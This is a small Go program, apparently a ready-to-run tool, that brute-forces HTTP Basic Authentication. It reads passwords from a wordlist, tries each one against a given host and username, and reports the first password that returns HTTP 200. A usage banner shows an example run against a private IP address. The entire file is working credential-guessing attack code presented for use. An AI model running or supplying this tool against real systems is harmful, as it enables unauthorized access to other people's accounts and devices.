package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"net/http"
	"os"
)

func main() {
	start()

	host, user, path := parseArgs()
	listaPassword(user, host, path)
}

func start() {
	fmt.Println("==========================================================================")
	fmt.Println("|                        BRUTE FORCE BASIC AUTH                          |")
	fmt.Println("|------------------------------------------------------------------------|")
	fmt.Println("|                              Execute                                   |")
	fmt.Println("| go run main.go -h=192.168.10.1 -u=username -p=/home/user/wordlist.txt  |")
	fmt.Println("|                                                                        |")
	fmt.Println("==========================================================================")

}

func parseArgs() (string, string, string) {
	var host, user, path string
	flag.StringVar(&host, "h", "", "host")
	flag.StringVar(&user, "u", "", "user")
	flag.StringVar(&path, "p", "", "path wordlist")

	flag.Parse()
	return host, user, path
}

func validarPassword(url, pass string) {
	resp, err := http.Get(url)

	if err != nil {
		panic(err)
	}

	if resp.StatusCode == 200 {
		fmt.Println("Password correct is ->", pass)
		os.Exit(0)
	}
}

func conctURL(username, password, host string) string {
	var buffer bytes.Buffer
	buffer.WriteString("http://")
	buffer.WriteString(username)
	buffer.WriteString(":")
	buffer.WriteString(password)
	buffer.WriteString("@")
	buffer.WriteString(host)
	return buffer.String()
}

func listaPassword(username, host, path string) {
	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		validarPassword(conctURL(username, scanner.Text(), host), scanner.Text())
	}
}
